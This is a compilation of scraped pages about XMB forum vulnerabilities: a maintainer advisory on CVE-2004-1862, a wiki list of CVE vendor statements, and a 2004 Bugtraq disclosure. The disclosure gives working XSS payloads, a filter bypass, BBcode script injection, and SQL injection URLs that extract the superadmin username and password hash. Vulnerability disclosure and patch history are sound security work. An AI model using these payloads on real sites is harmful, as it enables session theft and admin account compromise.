=== Content from forums.xmbforum2.com_fd95bb70_20250126_071645.html ===


| | | [XMB Forum Software](./) |  | | --- | --- | | Not logged in [[Login](misc.php?action=login) - [Register](member.php?action=reg)] | | | --- | --- | --- | --- | | | Search the forums [Search](search.php?fid=440)   Frequently Asked Questions [FAQ](faq.php)   View member list [Member List](misc.php?action=list)   Today's Posts [Today's Posts](today.php)   Forum Stats [Stats](stats.php)   Board Rules [Board Rules](faq.php?page=forumrules)  Download [Download](download.php)   Git [Git](https://github.com/miqrogroove/xmb)   Bugs [Bugs](https://bugs.xmbforum2.com/)   Docs [Docs](https://docs.xmbforum2.com/) | [Back to: XMB Forum Home Page](https://www.xmbforum2.com/ "XMB Forum Home Page") | | --- | --- | | |
| --- | --- | --- | --- | --- | --- | --- | --- |

| | [XMB Forum Software](./) » [Support](index.php?gid=20) » [Fixes / Patches](forumdisplay.php?fid=440) » [Security < 1.9.10] CVE-2004-1862 |  | [Go To Bottom](#bottom "Go To Bottom") | | --- | --- | --- | |
| --- | --- | --- | --- |

| [Printable Version](viewthread.php?action=printable&tid=777112) |  |
| --- | --- |

| | Author: | Subject: [Security < 1.9.10] CVE-2004-1862 | | --- | --- | | **[miqrogroove](./member.php?action=viewpro&member=miqrogroove)**  **XMB** 1.9.12 Lead Developer *********   ---   Avatar    Posts: 478  Registered: 10-1-2002  Member Is Offline   **Mood:** Past Three O'Clock | | [*] [posted on 5-9-2021 at 04:41 PM](viewthread.php?tid=777112&goto=search&pid=1376344 "[Security < 1.9.10] CVE-2004-1862") |  | | --- | --- | | | **[Security < 1.9.10] CVE-2004-1862**    Bug Source: XMB 1.9.9 and older  Symptoms: Unexpected output, Javascript compromise (XSS)  Security Impact: High  ID: CVE-2004-1862  Fixed By: XMB 1.9.10 and later are not affected.  Discussion:  Multiple exploits reported to Bugtraq in 2004 were evaluated by XMB staff in 2008. Of primary concern, the reported "XSS in post.php" had not been resolved and was still valid for one or more defects. The post.php file was reorganized in 2008 and released with version 1.9.10 to implement better I/O filtering. There were no hotfixes for old versions because the necessary changes were incompatible with existing customizations.   Recommendations:   Servers running PHP 7 or PHP 8   If you installed XMB 1.8 through 1.9.9 - [Upgrade to version 1.9.12](https://forums.xmbforum2.com/download.php). Servers running PHP 5   If you installed XMB 1.8 through 1.9.9 - [Upgrade to version 1.9.11](https://forums.xmbforum2.com/download.php). Please consider updating your server with a new version of PHP. [Upgrade Instructions](https://docs.xmbforum2.com/index.php?title=Upgrades) | | | [View user's profile](member.php?action=viewpro&member=miqrogroove "View user's profile") [Visit user's homepage](https://www.miqrogroove.com/ "Visit user's homepage") [View All Posts By User](search.php?srchuname=miqrogroove&searchsubmit=a&f=all&srchfrom=0 "View All Posts By User") |  | | --- | --- | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  |
| --- |
|  | |

| | [XMB Forum Software](./) » [Support](index.php?gid=20) » [Fixes / Patches](forumdisplay.php?fid=440) » [Security < 1.9.10] CVE-2004-1862 |  | [Go To Top](#top "Go To Top") | | --- | --- | --- | |
| --- | --- | --- | --- |

| | Powered by XMB 1.9.12 (Debug Mode)  [**XMB Forum Software**](https://www.xmbforum2.com/) © 2001-2025 The XMB Group  [Queries: **16**] [PHP: **30.2%** - SQL: **69.8%**] | | --- | |
| --- | --- |



=== Content from docs.xmbforum2.com_f80d321b_20250125_073634.html ===

## Anonymous

### Not logged in

* [Log in](/index.php?title=Special:UserLogin&returnto=Security+Issue+History "You are encouraged to log in; however, it is not mandatory [o]")
[XMBdocs](/index.php?title=Main_Page)
### Search

# Security Issue History

From XMBdocs
### Namespaces

* [Page](/index.php?title=Security_Issue_History "View the content page [c]")
* [Discussion](/index.php?title=Talk:Security_Issue_History&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")
### More

* More
### Page actions

* [Read](/index.php?title=Security_Issue_History)
* [View source](/index.php?title=Security_Issue_History&action=edit "This page is protected.
  You can view its source [e]")
* [History](/index.php?title=Security_Issue_History&action=history "Past revisions of this page [h]")

The following Vendor Security Statements have been issued in response to known vulnerabilities in XMB.

CVE-2002-0316

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2003-0375

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2003-0483

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

CVE-2004-0322

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

CVE-2004-0323

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

[CVE-2004-1862](https://forums.xmbforum2.com/viewthread.php?tid=777112)

XMB version 1.9.10 or later must be installed to prevent attacks described by this CVE. All earlier versions of XMB are vulnerable until upgraded. Upgrades are available at <https://www.xmbforum2.com/>

CVE-2004-1863

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

CVE-2004-1864

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

CVE-2004-2588

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2005-0885

XMB versions 1.9.8 and later were checked and are not vulnerable.

[CVE-2005-2574](https://forums.xmbforum2.com/viewthread.php?tid=777113)

XMB version 1.9.10 or later must be installed to prevent attacks described by this CVE. A patch is also included in the third service pack for version 1.9.8 only. All other versions of XMB are vulnerable until upgraded. Upgrades are available at <https://www.xmbforum2.com/>

CVE-2005-2575

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2005-3544

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2005-3688

This CVE is considered invalid because it duplicates CVE-2005-0885, "XMB versions 1.9.8 and later were checked and are not vulnerable."

CVE-2005-3689

XMB versions 1.9.8 SP2 and later were checked and are not vulnerable.

CVE-2006-0365

This CVE is considered invalid because it provides neither a description nor a version number adequate to identify any vulnerability in XMB.

CVE-2006-0778

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2006-0779

This CVE is considered invalid because it duplicates CVE-2005-3544, "XMB versions 1.9.8 and later were checked and are not vulnerable."

[CVE-2006-1748](https://nvd.nist.gov/vuln/detail/CVE-2006-1748)

XMB version 1.9.10 or later must be installed to prevent attacks described by this CVE. A patch is also included in the third service pack for version 1.9.8 only. All other versions of XMB are vulnerable until upgraded. Upgrades are available at <https://www.xmbforum2.com/>

CVE-2006-3994

XMB versions 1.9.8 and later were checked and are not vulnerable.

CVE-2006-4191

XMB versions 1.9.8 and later were checked and are not vulnerable.

[CVE-2007-0519](https://forums.xmbforum2.com/viewthread.php?tid=777115)

XMB version 1.9.10 or later must be installed to prevent attacks described by this CVE. A patch is also included in the third service pack for version 1.9.8 only. All other versions of XMB are vulnerable until upgraded. Upgrades are available at <https://www.xmbforum2.com/>

CVE-2007-6728

XMB versions 1.9.1 and later were checked and are not vulnerable.

[CVE-2021-29399](https://forums.xmbforum2.com/viewthread.php?tid=777105)

XMB version 1.9.12.03 or later must be installed to prevent attacks described by this CVE. A patch is also included in version 1.9.11.16. All other versions of XMB are vulnerable until upgraded. Upgrades are available at <https://www.xmbforum2.com/>

Retrieved from "<https://docs.xmbforum2.com/index.php?title=Security_Issue_History&oldid=300>"
## Navigation

### Navigation

* [Main page](/index.php?title=Main_Page "Visit the main page [z]")
* [Recent changes](/index.php?title=Special:RecentChanges "A list of recent changes in the wiki [r]")
* [Random page](/index.php?title=Special:Random "Load a random page [x]")
* [Help](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Help%3AContents "The place to find out")
### XMB

* [Home](https://www.xmbforum2.com/)
* [Forums](https://forums.xmbforum2.com/)
* [Bugs](https://bugs.xmbforum2.com/)
## Wiki tools

### Wiki tools

* [Special pages](/index.php?title=Special:SpecialPages "A list of all special pages [q]")
## Page tools

### Page tools

### User page tools

### More

* [What links here](/index.php?title=Special:WhatLinksHere/Security_Issue_History "A list of all wiki pages that link here [j]")
* [Related changes](/index.php?title=Special:RecentChangesLinked/Security_Issue_History "Recent changes in pages linked from this page [k]")
* Printable version
* [Permanent link](/index.php?title=Security_Issue_History&oldid=300 "Permanent link to this revision of this page")
* [Page information](/index.php?title=Security_Issue_History&action=info "More information about this page")
* [Page logs](/index.php?title=Special:Log&page=Security+Issue+History)

* [![GNU Free Documentation License 1.3 or later](/resources/assets/licenses/gnu-fdl.png)](https://www.gnu.org/copyleft/fdl.html)
* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)

* This page was last edited on 10 May 2021, at 07:16.
* Content is available under [GNU Free Documentation License 1.3 or later](https://www.gnu.org/copyleft/fdl.html) unless otherwise noted.

* [Privacy policy](/index.php?title=XMBdocs:Privacy_policy)
* [About XMBdocs](/index.php?title=XMBdocs:About)
* [Disclaimers](/index.php?title=XMBdocs:General_disclaimer)



=== Content from marc.info_702767fd_20250125_073632.html ===

```
[[prev in list](?l=bugtraq&m=107756543129825&w=2)] [[next in list](?l=bugtraq&m=107756920426933&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=107774206102096&w=2)]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    [[waraxe-2004-SA#004] - Multiple vulnerabilities in XMB 1.8](?t=107756528300003&r=1&w=2)
From:       [Janek Vind <come2waraxe () yahoo ! com>](?a=107582551000004&r=1&w=2)
Date:       [2004-02-23 18:47:37](?l=bugtraq&r=1&w=2&b=200402)
Message-ID: [20040223184737.27470.qmail () www ! securityfocus ! com](?i=20040223184737.27470.qmail%20()%20www%20!%20securityfocus%20!%20com)
[Download RAW [message](?l=bugtraq&m=107756526625179&q=mbox) or [body](?l=bugtraq&m=107756526625179&q=raw)]

{================================================================================}
{                              [waraxe-2004-SA#004]                              }
{================================================================================}
{                                                                                }
{         [ Multiple vulnerabilities in XMB 1.8 Partagium Final SP2 ]            }
{                                                                                }
{================================================================================}
                                                                                      \

Author: Janek Vind "waraxe"
Date: 23 Feb 2004
Location: Estonia, Tartu

Affected software description:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

     Extreme Messageboard aka XMB is very popular and feature rich forum,
based on php and mysql. More information can be found on sites
<http://www.aventure-media.co.uk> and <http://www.xmbforum.com>

Vulnerabilities:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Multiple vulnerabilites have been found in XMB 1.8 Final SP2 version
and possibly in older versions too. Any of them can lead to total
compromise of the website, if affected account has SuperAdmin status.

Remark: line references apply to build version "Build: 2003100518".

Let's begin...

1. Security filter in header.php line 110 can be bypassed, if we partially
or fully urlencode the critical parts in URI. Thanks to this vulnerability
possible XSS holes can be easily exploited by GET request.

Original code:

// Checks for various variables in the URL, if any of them is found, script is halted
	$url2 = str_replace("subscriptions","",$url);
	$url_check = Array('status', 'xmbuser', 'xmbpw','script','javascript');
	foreach ($url_check as $name) {
	 	if (eregi($name, $url2)){
	 		exit();
	 	}
	}

Example of the filter bypass:

<http://localhost/xmb18sp2/forumdisplay.php?fid=1&foobar=><%73cript>

2. XSS in member.php

example exploitation:

<http://localhost/xmb18sp2/member.php?action=viewpro&member=x><%73cript>alert(document.cookie);</%73cript>

3. XSS in u2uadmin.php

example exploitation:

<http://localhost/xmb18sp2/u2uadmin.php?uid=x>"><%73cript>alert(document.cookie);</%73cript>

4. XSS in editprofile.php

example exploitation:

<http://localhost/xmb18sp2/editprofile.php?user=x>"><%73cript>alert(document.cookie);</%73cript>

5. BBcode "[align=xxx][/align]" script injection vulnerability:

example exploitation:

text1 [align=center onmouseover=alert(document.cookie);] text2 [/align]

This can be used everywhere, where bbcode is allowed - in profile's signature, u2u \
and in forum threads.  Scripting will be triggered on mouseover event and will work \
with most browsers.

6. BBcode "[img=1x1][/img]" script injection vulnerabilty:

example exploitation:

text1 [img=1x1]javascript:alert(document.cookie);//gif[/img] text2

Ending "//gif" is needed for successful exploit, because bbcode implementation will \
check for it.

This can be used everywhere, where bbcode is allowed - in profile's signature, u2u \
and in forum threads.  Scripting will be triggered automatically, but exploit will \
work only with  M$ Internet Explorer.

**************************************************************************
Remark: Next vulnerabilities are sql injections. Cases 7,8,9 will offer
injection possibility after "ORDER BY" keywords in sql query,
therefore UNION method will not work. Only bad thing, attacker can
make, is failing of the sql query and provoking of the sql error
message. Because XMB forum so nicely will show sql error messages
for all the world (this feature is implemented in mysql.php file),
we can "convert" the  sql injection to the exploitable XSS!
**************************************************************************

7. SQL injection in viewthread.php line 250: (NB!! successful only, if currently \
logged out)

<http://localhost/xmb18sp2/viewthread.php?tid=1&ppp=x>

example exploitation:

<http://localhost/xmb18sp2/viewthread.php?tid=1&ppp=x><%73cript>alert(document.cookie);</%73cript>

8. SQL injections in misc.php lines 387,391,395

<http://localhost/xmb18sp2/misc.php?action=list&order=postnum&desc=x>

example exploitation:

<http://localhost/xmb18sp2/misc.php?action=list&order=postnum&desc=x><%73cript>alert(document.cookie);</%73cript>

9. SQL injections in forumdisplay.php lines 135,325

<http://localhost/xmb18sp2/forumdisplay.php?fid=1&tpp=x>

<http://localhost/xmb18sp2/forumdisplay.php?fid=1&ascdesc=x>

example exploitations:

<http://localhost/xmb18sp2/forumdisplay.php?fid=1&tpp=x><%73cript>alert(document.cookie);</%73cript>

<http://localhost/xmb18sp2/forumdisplay.php?fid=1&ascdesc=x><%73cript>alert(document.cookie);</%73cript>

*********************** [really scary sql hole] ***********************

10. SQL injections in stats.php lines 89,96,103

<http://localhost/xmb18sp2/stats.php?action=view&addon=x>

exploitations:

getting username for superadmin:

<http://localhost/xmb18sp2/stats.php?action=view&addon=WHERE> t.tid<0 UNION ALL SELECT \
NULL,NULL,username FROM xmb_members WHERE uid=1 LIMIT 1/*

getting password's md5 hash for superadmin:

<http://localhost/xmb18sp2/stats.php?action=view&addon=WHERE> t.tid<0 UNION ALL SELECT \
NULL,NULL,password FROM xmb_members WHERE uid=1 LIMIT 1/*

*********************** [/really scary sql hole] **********************

Greetings:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    Greetings goes to ulljobu, djzone, raider and to torufoorum staff!
    Special greets to marius and biacci!

Contact:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    come2waraxe@yahoo.com
    Janek Vind "waraxe"

---------------------------------- [ EOF ] ------------------------------------

[[prev in list](?l=bugtraq&m=107756543129825&w=2)] [[next in list](?l=bugtraq&m=107756920426933&w=2)] [prev in thread] [[next in thread](?l=bugtraq&m=107774206102096&w=2)]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


